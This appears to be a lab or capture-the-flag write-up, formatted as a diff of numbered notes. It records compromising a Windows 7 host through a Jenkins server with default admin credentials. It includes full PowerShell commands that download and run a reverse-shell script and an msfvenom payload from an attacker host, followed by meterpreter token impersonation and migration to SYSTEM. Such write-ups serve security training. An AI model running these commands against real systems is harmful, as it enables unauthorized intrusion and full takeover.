@@ -1,0 +1,23 @@
+1: first scan through nmap returned host is down though a second attempt was made using -Pn flag
+2: 3 tcp ports discovered: 80, 3389, 8080 and their relative services
+3: reaching http services on port 80 and 8080 to look for vulnerabilities and hints.
+4: nothing usefull found on http service port 80. reaching http service on port 8080 revelead jenkins login form 
+5: login form had poor credentials guessed as username:admin and password:admin
+6: OS confirmed as windows 7
+7: feature found on jenkins manager allowe to execute powershell command. this feature is avaible when creating a new item as a freestyle project then in build option set "execute windows batch command"
+8: open nc server on port 9001
+9: open http server on port 9000 hosting a malicious script
+10: executing the following command on the "script console" function: powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.144.90:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.144.90 -Port 9001
+11: gained shell as bruce user on the target machine. 
+12: creating an msfvenom reverse shell payload on the attacker machine then setting up a http server on the same folder.
+13: payload downloaded on the target machine through this command: powershell "(New-Object System.Net.WebClient).Downloadfile('http://192.168.144.90:9000/shell-name.exe','shell-name.exe')"
+14: setting up multi/handler on metasploit. Run the payload with: Start-Process "shell-name.exe"
+15: gained meterpreter on the target
+16: dropping into a shell to check what privilege the current user has. command: whoami /priv
+17: SeDebugPrivilege, SeImpersonatePrivilege are enabled for the current user
+18: loading incognito module on meterpreter. list_tokens -g showed BUILTIN\Administrators as an avaible token
+19: Using the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators
+: with this method user's administrator privileges are limited to a few operations. To make them system wide we need to migrate meterpreter to a high privilege process leveraging our impersonated privileges
+20: ps command showed some process running as AUTHORITY\SYSTEM
+21: running migrate PID-OF-PROCESS we've obtained system-wide LocalSystem privileges.  
+  
